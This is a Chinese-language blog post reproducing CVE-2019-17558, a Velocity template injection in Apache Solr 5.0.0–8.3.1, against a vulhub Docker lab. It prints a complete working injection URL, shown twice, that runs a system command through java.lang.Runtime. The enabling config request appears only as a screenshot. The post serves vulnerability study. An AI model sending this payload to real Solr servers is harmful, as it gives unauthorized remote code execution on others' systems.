---
layout: post
title: Apache Solr Velocity 注入远程命令执行漏洞
tags: solr
categories: CVE-2019-17558
---

# Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)

## 漏洞描述

Apache Solr 是一个开源的搜索服务器。
在其 5.0.0 到 8.3.1版本中，用户可以注入自定义Velocity模板，由于用户自定义的 configset 可能包含可呈现的、潜在恶意的模板，默认情况下，官方提供的参数模板是禁用的，然而攻击者可以通过定义一个将该配置设置为 "true" 的响应写入器来启用 "parms .resource.loader. loader”，从而达到远程代码执行的目的。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8983/`即可查看到Apache solr的管理页面，无需登录

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-17558/15936859317175.jpg)

默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。我们先通过如下API获取所有的核心：`http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-17558/15936861305256.jpg)

通过如下请求开启params.resource.loader.enabled，其中API路径包含刚才获取的Core（核心）名称：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-17558/15936866511129.jpg)

之后，发送如下请求注入Velocity模板即可执行任意命令：

`http://127.0.0.1:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id'))+$ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-17558/15936866872187.jpg)

payload
`http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id'))+$ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end`

## 受影响的版本

5.0.0 到 8.3.1版本

## 参考链接

https://www.hotbak.net/key/538fe9a8177de1dab91d0b2c5d699188_29.html